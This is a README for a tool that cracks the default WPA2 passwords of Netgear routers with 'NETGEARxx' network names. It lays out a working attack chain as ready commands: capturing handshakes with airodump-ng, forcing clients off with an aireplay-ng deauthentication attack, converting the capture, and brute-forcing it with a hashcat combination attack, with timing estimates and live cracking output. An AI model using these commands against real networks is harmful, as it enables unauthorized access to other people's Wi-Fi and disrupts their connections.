
# Netgear WPA Wordlist

A wordlist for targeting netgear router default WPA2 passwords

Many Netgear routers with the SSID of `NETGEARxx` (where xx is a two digit number) have a default Wi-Fi password with the following pattern:
```
[english adjective][english noun][3 digit number]
```

Security researchers have noted that this password scheme does not provide a sufficient amount of entropy to generate secure Wi-Fi passwords.

## Generating Wordlist

In order to optimize wordlist file sizes, we will use two wordlists to feed into hashcat's Combination attack mode.

The first wordlist will be a list of 5000 adjectives.
- top\_english\_adjs\_lower\_5000.txt

The second wordlist will be a list of all combinations of a list of 10000 nouns with all possible 3 digit numbers.
Not wanting to commit a 106M wordlist to this repo, we will use the included python script to generate the second wordlist file(`nouns-numbers.txt`):
```
generate-nouns-numbers.py
```

## Capturing WPA 4-way Handshake

save 4-way handshake to pcap:
```
sudo airodump-ng wlan0 --essid-regex NETGEAR[1-9]{2} -w psk
```

deauth client connected to targeted access point to get a handshake
```
sudo aireplay-ng -0 1 -a <AP MAC> -c <CLIENT MAC> wlan0
```

convert pcap to hashcat format
```
hcxpcapngtool -o hash.hc22000 -E wordlist psk-01.cap
```

## Cracking WPA Password Hash

hashcat Combination attack mode
```
hashcat -m 22000 -a 1 hash.hc22000 top_english_adjs_lower_5000.txt nouns-n-numbers.txt
```

## Math & Benchmarking

testing was performed with 1 Nvidia 2080TI GPU

- 2080TI hashing speed
    - 125100 WPA2 hashes per second (hashcat mode 22000)
- adjective wordlist size
    - top\_english\_adjs\_lower\_5000.txt: 5000
- noun + 3 digit number wordlist size
    - nouns-n-numbers.txt: 10000000
- total number of password guesses
    - 50000000000 = 5000 * 10000000
- time to crack all possible passwords
    - 50000000000 guesses / 125100 hashes/second = 399680 seconds
    - 111 hours
    - 4.6 days

```
Session..........: hashcat
Status...........: Running
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: hash.hc22000
Time.Started.....: Wed Sep 13 18:52:20 2023 (2 secs)
Time.Estimated...: Sun Sep 17 21:52:17 2023 (4 days, 2 hours)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (top-english-wordlists/top_english_adjs_lower_5000.txt), Left Side
Guess.Mod........: File (nouns-n-numbers.txt), Right Side
Speed.#1.........:   140.3 kH/s (0.32ms) @ Accel:64 Loops:128 Thr:32 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 158848/50000000000 (0.00%)
Rejected.........: 0/158848 (0.00%)
Restore.Point....: 0/5000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:73-74 Iteration:3712-3840
Candidate.Engine.: Device Generator
Candidates.#1....: othertime073 -> paradoxicaltime073
Hardware.Mon.#1..: Temp: 47c Fan: 14% Util: 66% Core:1965MHz Mem:6800MHz Bus:16
```

## References

- https://github.com/3mrgnc3/RouterKeySpaceWordlists
- https://www.aircrack-ng.org/doku.php?id=cracking_wpa
- https://github.com/david47k/top-english-wordlists
- https://hashcat.net/forum/thread-7443-post-40036.html#pid40036
- https://hashcat.net/wiki/doku.php?id=example_hashes
